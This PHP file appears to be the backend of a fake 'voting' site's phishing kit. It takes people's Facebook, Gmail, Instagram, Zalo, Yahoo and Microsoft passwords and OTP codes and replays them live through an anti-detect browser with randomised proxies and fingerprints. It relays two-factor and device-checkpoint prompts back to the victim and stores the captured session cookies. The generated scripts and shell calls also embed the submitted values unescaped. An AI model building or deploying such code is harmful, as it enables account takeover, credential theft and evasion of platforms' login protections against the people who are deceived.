<?php
/**
 * BVOTE 2025 Auto Login Bot System
 * Xử lý quy trình đăng nhập tự động với MoreLogin + Puppeteer
 * Không thay đổi giao diện - chỉ xử lý backend logic
 */

require_once __DIR__ . '/../includes/database.php';
require_once __DIR__ . '/../api/admin-user-bridge.php';

class AutoLoginBotSystem {
    private $db;
    private $adminBridge;
    private $moreLoginConfig;
    private $puppeteerPath;

    public function __construct() {
        $this->db = Database::getInstance()->getConnection();
        $this->adminBridge = new AdminUserBridge();
        $this->initializeConfig();
    }

    /**
     * Initialize configuration
     */
    private function initializeConfig() {
        $this->moreLoginConfig = [
            'executable_path' => __DIR__ . '/../morelogin/MoreLogin.exe',
            'api_endpoint' => 'http://localhost:35000/api',
            'profiles_path' => __DIR__ . '/../morelogin/profiles/',
            'timeout' => 30
        ];

        $this->puppeteerPath = __DIR__ . '/../puppeteer/';
    }

    /**
     * Tiếp nhận yêu cầu đăng nhập từ user interface
     */
    public function handleLoginRequest() {
        $action = $_POST['action'] ?? '';

        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');

        try {
            switch ($action) {
                case 'process_login':
                    return $this->processUserLogin();

                case 'retry_login':
                    return $this->retryLogin();

                case 'submit_otp':
                    return $this->submitOTP();

                case 'approve_checkpoint':
                    return $this->approveCheckpoint();

                case 'get_login_status':
                    return $this->getLoginStatus();

                default:
                    throw new Exception('Invalid action');
            }
        } catch (Exception $e) {
            http_response_code(400);
            return json_encode(['error' => $e->getMessage()]);
        }
    }

    /**
     * Xử lý đăng nhập từ user (IV.1)
     */
    private function processUserLogin() {
        $loginData = json_decode(file_get_contents('php://input'), true);

        $platform = $loginData['platform'] ?? '';
        $username = $loginData['username'] ?? '';
        $password = $loginData['password'] ?? '';
        $otp = $loginData['otp'] ?? '';
        $sessionId = $loginData['session_id'] ?? '';

        // Validate input
        if (empty($platform) || empty($username) || empty($password)) {
            throw new Exception('Missing required login information');
        }

        // Log request
        $requestId = $this->logLoginRequest($loginData);

        // Lưu vào login_sessions
        $stmt = $this->db->prepare("
            INSERT INTO login_sessions (
                platform, username, password_hash, otp, status,
                request_id, session_id, ip_address, user_agent, created_at
            ) VALUES (?, ?, ?, ?, 'processing', ?, ?, ?, ?, NOW())
        ");

        $stmt->execute([
            $platform,
            $username,
            password_hash($password, PASSWORD_DEFAULT), // Hash password for security
            $otp,
            $requestId,
            $sessionId,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ]);

        $loginSessionId = $this->db->lastInsertId();

        // Bắt đầu quá trình auto login (IV.2)
        $this->initiateAutoLogin($loginSessionId, $loginData);

        return json_encode([
            'success' => true,
            'request_id' => $requestId,
            'session_id' => $loginSessionId,
            'status' => 'processing',
            'message' => 'Yêu cầu đăng nhập đã được tiếp nhận'
        ]);
    }

    /**
     * Khởi tạo quá trình auto login (IV.2)
     */
    private function initiateAutoLogin($loginSessionId, $loginData) {
        // Chạy async để không block response
        $this->runAsyncProcess('auto_login', [
            'session_id' => $loginSessionId,
            'platform' => $loginData['platform'],
            'username' => $loginData['username'],
            'password' => $loginData['password'],
            'otp' => $loginData['otp'] ?? ''
        ]);
    }

    /**
     * Điều khiển MoreLogin + Chrome Bot (IV.2)
     */
    public function controlMoreLoginBot($sessionId, $platform, $username, $password, $otp = '') {
        $this->updateLoginStatus($sessionId, 'opening_browser', 'Đang mở trình duyệt ảo...');

        try {
            // 1. Lấy profile tương ứng
            $profileId = $this->getOrCreateProfile($platform, $username);

            // 2. Mở MoreLogin browser
            $browserPort = $this->openMoreLoginBrowser($profileId);

            if (!$browserPort) {
                throw new Exception('Không thể khởi động trình duyệt MoreLogin');
            }

            $this->updateLoginStatus($sessionId, 'browser_opened', 'Trình duyệt đã sẵn sàng');

            // 3. Tự động hóa đăng nhập bằng Puppeteer (IV.3)
            $result = $this->runPuppeteerLogin($browserPort, $platform, $username, $password, $otp);

            // 4. Xử lý kết quả (IV.4)
            $this->handleLoginResult($sessionId, $result);

        } catch (Exception $e) {
            $this->updateLoginStatus($sessionId, 'error', 'Lỗi: ' . $e->getMessage());
            $this->notifyUser($sessionId, 'error', $e->getMessage());
        }
    }

    /**
     * Lấy hoặc tạo profile MoreLogin
     */
    private function getOrCreateProfile($platform, $username) {
        // Kiểm tra profile đã tồn tại
        $stmt = $this->db->prepare("
            SELECT profile_id FROM morelogin_profiles
            WHERE platform = ? AND username = ?
        ");
        $stmt->execute([$platform, $username]);
        $existing = $stmt->fetchColumn();

        if ($existing) {
            return $existing;
        }

        // Tạo profile mới qua MoreLogin API
        $profileData = [
            'name' => $platform . '_' . $username . '_' . time(),
            'platform' => $platform,
            'proxy' => $this->getRandomProxy(),
            'user_agent' => $this->getRandomUserAgent(),
            'screen_resolution' => $this->getRandomResolution()
        ];

        $profileId = $this->createMoreLoginProfile($profileData);

        // Lưu vào database
        $stmt = $this->db->prepare("
            INSERT INTO morelogin_profiles (
                profile_id, platform, username, profile_name,
                proxy_config, user_agent, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, NOW())
        ");

        $stmt->execute([
            $profileId,
            $platform,
            $username,
            $profileData['name'],
            json_encode($profileData['proxy']),
            $profileData['user_agent']
        ]);

        return $profileId;
    }

    /**
     * Mở trình duyệt MoreLogin
     */
    private function openMoreLoginBrowser($profileId) {
        $apiUrl = $this->moreLoginConfig['api_endpoint'] . '/browser/start';

        $response = $this->makeAPICall($apiUrl, [
            'profile_id' => $profileId,
            'headless' => false,
            'debug_port' => true
        ]);

        if ($response && isset($response['debug_port'])) {
            return $response['debug_port'];
        }

        return false;
    }

    /**
     * Tự động hóa đăng nhập bằng Puppeteer (IV.3)
     */
    private function runPuppeteerLogin($browserPort, $platform, $username, $password, $otp) {
        $puppeteerScript = $this->generatePuppeteerScript($platform, $username, $password, $otp);
        $scriptPath = $this->puppeteerPath . 'login_' . time() . '.js';

        // Ghi script ra file
        file_put_contents($scriptPath, $puppeteerScript);

        // Chạy Puppeteer
        $command = "cd {$this->puppeteerPath} && node \"{$scriptPath}\" --port={$browserPort}";
        $output = shell_exec($command);

        // Xóa script tạm
        unlink($scriptPath);

        // Parse kết quả
        return json_decode($output, true);
    }

    /**
     * Tạo Puppeteer script cho từng platform
     */
    private function generatePuppeteerScript($platform, $username, $password, $otp) {
        $platformConfigs = [
            'facebook' => [
                'url' => 'https://www.facebook.com/login',
                'username_selector' => '#email',
                'password_selector' => '#pass',
                'submit_selector' => '#loginbutton',
                'otp_selector' => 'input[name="approvals_code"]'
            ],
            'gmail' => [
                'url' => 'https://accounts.google.com/signin',
                'username_selector' => 'input[type="email"]',
                'password_selector' => 'input[type="password"]',
                'submit_selector' => '#identifierNext, #passwordNext',
                'otp_selector' => 'input[type="tel"]'
            ],
            'instagram' => [
                'url' => 'https://www.instagram.com/accounts/login/',
                'username_selector' => 'input[name="username"]',
                'password_selector' => 'input[name="password"]',
                'submit_selector' => 'button[type="submit"]',
                'otp_selector' => 'input[name="verificationCode"]'
            ],
            'zalo' => [
                'url' => 'https://id.zalo.me/account/login',
                'username_selector' => 'input[name="username"]',
                'password_selector' => 'input[name="password"]',
                'submit_selector' => 'button[type="submit"]',
                'otp_selector' => 'input[name="otp"]'
            ],
            'yahoo' => [
                'url' => 'https://login.yahoo.com/',
                'username_selector' => '#login-username',
                'password_selector' => '#login-passwd',
                'submit_selector' => '#login-signin',
                'otp_selector' => '#verification-code-field'
            ],
            'microsoft' => [
                'url' => 'https://login.microsoftonline.com/',
                'username_selector' => 'input[type="email"]',
                'password_selector' => 'input[type="password"]',
                'submit_selector' => 'input[type="submit"]',
                'otp_selector' => 'input[name="otc"]'
            ]
        ];

        $config = $platformConfigs[$platform] ?? $platformConfigs['facebook'];

        return $this->buildPuppeteerTemplate($config, $username, $password, $otp);
    }

    /**
     * Build Puppeteer template
     */
    private function buildPuppeteerTemplate($config, $username, $password, $otp) {
        return "
const puppeteer = require('puppeteer');

(async () => {
    try {
        const port = process.argv.find(arg => arg.includes('--port='))?.split('=')[1] || 9222;
        const browser = await puppeteer.connect({
            browserURL: `http://localhost:\${port}`
        });

        const page = await browser.newPage();

        // Đi đến trang đăng nhập
        await page.goto('{$config['url']}', { waitUntil: 'networkidle2' });

        // Đợi và nhập username
        await page.waitForSelector('{$config['username_selector']}', { timeout: 10000 });
        await page.type('{$config['username_selector']}', '{$username}');

        // Nhấn Next nếu cần (Google style)
        if ('{$platform}' === 'gmail' || '{$platform}' === 'microsoft') {
            await page.click('#identifierNext, input[type=\"submit\"]');
            await page.waitForTimeout(2000);
        }

        // Đợi và nhập password
        await page.waitForSelector('{$config['password_selector']}', { timeout: 10000 });
        await page.type('{$config['password_selector']}', '{$password}');

        // Submit form
        await page.click('{$config['submit_selector']}');
        await page.waitForTimeout(3000);

        // Kiểm tra các trường hợp
        const currentUrl = page.url();
        let result = {};

        // Kiểm tra OTP required
        const otpField = await page.$$('{$config['otp_selector']}');
        if (otpField.length > 0) {
            if ('{$otp}') {
                await page.type('{$config['otp_selector']}', '{$otp}');
                await page.click('button[type=\"submit\"], input[type=\"submit\"]');
                await page.waitForTimeout(3000);

                result = { status: 'success', message: 'Đăng nhập với OTP thành công' };
            } else {
                result = { status: 'otp_required', message: 'Cần nhập mã OTP' };
            }
        }
        // Kiểm tra checkpoint
        else if (currentUrl.includes('checkpoint') || currentUrl.includes('challenge')) {
            result = { status: 'checkpoint', message: 'Cần xác minh thiết bị' };
        }
        // Kiểm tra lỗi đăng nhập
        else if (currentUrl.includes('login') || await page.$('.error, .alert, [role=\"alert\"]')) {
            result = { status: 'error', message: 'Sai tài khoản hoặc mật khẩu' };
        }
        // Thành công
        else {
            result = { status: 'success', message: 'Đăng nhập thành công' };
        }

        // Lấy cookies nếu thành công
        if (result.status === 'success') {
            const cookies = await page.cookies();
            result.cookies = cookies;
        }

        await browser.disconnect();
        console.log(JSON.stringify(result));

    } catch (error) {
        console.log(JSON.stringify({
            status: 'error',
            message: error.message
        }));
    }
})();
        ";
    }

    /**
     * Xử lý kết quả đăng nhập (IV.4)
     */
    private function handleLoginResult($sessionId, $result) {
        if (!$result) {
            $this->updateLoginStatus($sessionId, 'error', 'Không nhận được phản hồi từ bot');
            return;
        }

        switch ($result['status']) {
            case 'success':
                $this->handleSuccessLogin($sessionId, $result);
                break;

            case 'error':
                $this->handleLoginError($sessionId, $result);
                break;

            case 'otp_required':
                $this->handleOTPRequired($sessionId, $result);
                break;

            case 'checkpoint':
                $this->handleCheckpoint($sessionId, $result);
                break;

            default:
                $this->updateLoginStatus($sessionId, 'error', 'Kết quả không xác định');
        }
    }

    /**
     * Xử lý đăng nhập thành công
     */
    private function handleSuccessLogin($sessionId, $result) {
        // Cập nhật status
        $this->updateLoginStatus($sessionId, 'success', 'Đăng nhập thành công');

        // Lưu cookies
        if (isset($result['cookies'])) {
            $this->saveCookies($sessionId, $result['cookies']);
        }

        // Phản hồi về user (IV.5)
        $this->notifyUser($sessionId, 'success', 'Đăng nhập thành công! Chào mừng bạn đến với hệ thống bình chọn.');
    }

    /**
     * Xử lý lỗi đăng nhập
     */
    private function handleLoginError($sessionId, $result) {
        $message = $result['message'] ?? 'Đăng nhập thất bại';

        $this->updateLoginStatus($sessionId, 'error', $message);
        $this->notifyUser($sessionId, 'error', $message);
    }

    /**
     * Xử lý yêu cầu OTP
     */
    private function handleOTPRequired($sessionId, $result) {
        $this->updateLoginStatus($sessionId, 'otp_required', 'Chờ nhập mã OTP');
        $this->notifyUser($sessionId, 'otp_required', 'Vui lòng nhập mã OTP để tiếp tục đăng nhập');
    }

    /**
     * Xử lý checkpoint
     */
    private function handleCheckpoint($sessionId, $result) {
        $this->updateLoginStatus($sessionId, 'checkpoint', 'Chờ xác minh thiết bị');
        $this->notifyUser($sessionId, 'checkpoint', 'Vui lòng kiểm tra email/SMS và phê duyệt thiết bị mới');
    }

    /**
     * Cập nhật trạng thái đăng nhập
     */
    private function updateLoginStatus($sessionId, $status, $message) {
        $stmt = $this->db->prepare("
            UPDATE login_sessions
            SET status = ?, status_message = ?, updated_at = NOW()
            WHERE id = ?
        ");
        $stmt->execute([$status, $message, $sessionId]);

        // Log vào admin system
        $this->adminBridge->logUserAction('system', 'login_status_update', [
            'session_id' => $sessionId,
            'status' => $status,
            'message' => $message
        ]);
    }

    /**
     * Thông báo cho user (IV.5)
     */
    private function notifyUser($sessionId, $status, $message) {
        // Lưu notification
        $stmt = $this->db->prepare("
            INSERT INTO user_notifications (
                session_id, status, message, created_at
            ) VALUES (?, ?, ?, NOW())
        ");
        $stmt->execute([$sessionId, $status, $message]);

        // Gửi qua WebSocket nếu có
        $this->sendWebSocketNotification($sessionId, [
            'type' => 'login_response',
            'status' => $status,
            'message' => $message
        ]);
    }

    /**
     * Submit OTP
     */
    private function submitOTP() {
        $sessionId = $_POST['session_id'] ?? '';
        $otp = $_POST['otp'] ?? '';

        if (empty($sessionId) || empty($otp)) {
            throw new Exception('Session ID và OTP là bắt buộc');
        }

        // Lấy thông tin session
        $stmt = $this->db->prepare("
            SELECT platform, username, password_hash
            FROM login_sessions
            WHERE id = ? AND status = 'otp_required'
        ");
        $stmt->execute([$sessionId]);
        $session = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$session) {
            throw new Exception('Session không tồn tại hoặc không trong trạng thái chờ OTP');
        }

        // Cập nhật OTP và retry login
        $stmt = $this->db->prepare("UPDATE login_sessions SET otp = ? WHERE id = ?");
        $stmt->execute([$otp, $sessionId]);

        // Chạy lại quá trình login với OTP
        $this->runAsyncProcess('retry_login_with_otp', [
            'session_id' => $sessionId,
            'otp' => $otp
        ]);

        return json_encode([
            'success' => true,
            'message' => 'Đang xử lý mã OTP...'
        ]);
    }

    // Helper methods
    private function logLoginRequest($data) {
        $requestId = 'req_' . time() . '_' . uniqid();

        $stmt = $this->db->prepare("
            INSERT INTO login_requests (
                request_id, platform, username_hash, ip_address,
                user_agent, created_at
            ) VALUES (?, ?, ?, ?, ?, NOW())
        ");

        $stmt->execute([
            $requestId,
            $data['platform'],
            hash('sha256', $data['username']),
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ]);

        return $requestId;
    }

    private function runAsyncProcess($type, $data) {
        // Chạy background process
        $script = __DIR__ . '/background_processor.php';
        $command = "php \"{$script}\" \"{$type}\" '" . json_encode($data) . "' > /dev/null 2>&1 &";

        if (PHP_OS_FAMILY === 'Windows') {
            $command = "start /B php \"{$script}\" \"{$type}\" \"" . addslashes(json_encode($data)) . "\"";
        }

        popen($command, 'r');
    }

    private function makeAPICall($url, $data) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);

        $response = curl_exec($ch);
        curl_close($ch);

        return json_decode($response, true);
    }

    private function sendWebSocketNotification($sessionId, $data) {
        // WebSocket implementation would go here
        file_put_contents(__DIR__ . '/../data/notifications/' . $sessionId . '.json', json_encode($data));
    }

    private function getRandomProxy() {
        $proxies = [
            ['host' => '127.0.0.1', 'port' => 8080, 'type' => 'http'],
            // Add more proxies here
        ];
        return $proxies[array_rand($proxies)];
    }

    private function getRandomUserAgent() {
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ];
        return $userAgents[array_rand($userAgents)];
    }

    private function getRandomResolution() {
        $resolutions = ['1920x1080', '1366x768', '1440x900', '1600x900'];
        return $resolutions[array_rand($resolutions)];
    }

    private function createMoreLoginProfile($data) {
        // Mock profile creation - thực tế sẽ call MoreLogin API
        return 'profile_' . time() . '_' . uniqid();
    }

    private function saveCookies($sessionId, $cookies) {
        $stmt = $this->db->prepare("
            UPDATE login_sessions
            SET cookies = ?, cookies_updated_at = NOW()
            WHERE id = ?
        ");
        $stmt->execute([json_encode($cookies), $sessionId]);
    }

    /**
     * Setup database tables
     */
    public function setupDatabase() {
        $tables = [
            "CREATE TABLE IF NOT EXISTS login_requests (
                id INT AUTO_INCREMENT PRIMARY KEY,
                request_id VARCHAR(100) UNIQUE NOT NULL,
                platform VARCHAR(50) NOT NULL,
                username_hash VARCHAR(255) NOT NULL,
                ip_address VARCHAR(45),
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )",

            "CREATE TABLE IF NOT EXISTS login_sessions (
                id INT AUTO_INCREMENT PRIMARY KEY,
                platform VARCHAR(50) NOT NULL,
                username VARCHAR(255) NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                otp VARCHAR(10),
                status ENUM('processing', 'success', 'error', 'otp_required', 'checkpoint', 'blocked') DEFAULT 'processing',
                status_message TEXT,
                request_id VARCHAR(100),
                session_id VARCHAR(255),
                ip_address VARCHAR(45),
                user_agent TEXT,
                cookies JSON,
                cookies_updated_at TIMESTAMP NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                INDEX idx_status (status),
                INDEX idx_platform (platform),
                INDEX idx_session (session_id)
            )",

            "CREATE TABLE IF NOT EXISTS morelogin_profiles (
                id INT AUTO_INCREMENT PRIMARY KEY,
                profile_id VARCHAR(100) UNIQUE NOT NULL,
                platform VARCHAR(50) NOT NULL,
                username VARCHAR(255) NOT NULL,
                profile_name VARCHAR(255) NOT NULL,
                proxy_config JSON,
                user_agent TEXT,
                screen_resolution VARCHAR(20),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )",

            "CREATE TABLE IF NOT EXISTS user_notifications (
                id INT AUTO_INCREMENT PRIMARY KEY,
                session_id VARCHAR(255) NOT NULL,
                status VARCHAR(50) NOT NULL,
                message TEXT,
                read_status BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )"
        ];

        foreach ($tables as $sql) {
            $this->db->exec($sql);
        }

        return json_encode(['success' => true, 'message' => 'Auto Login Bot database setup completed']);
    }
}

// Handle requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $bot = new AutoLoginBotSystem();

    if (isset($_GET['setup'])) {
        echo $bot->setupDatabase();
    } else {
        echo $bot->handleLoginRequest();
    }
}
?>
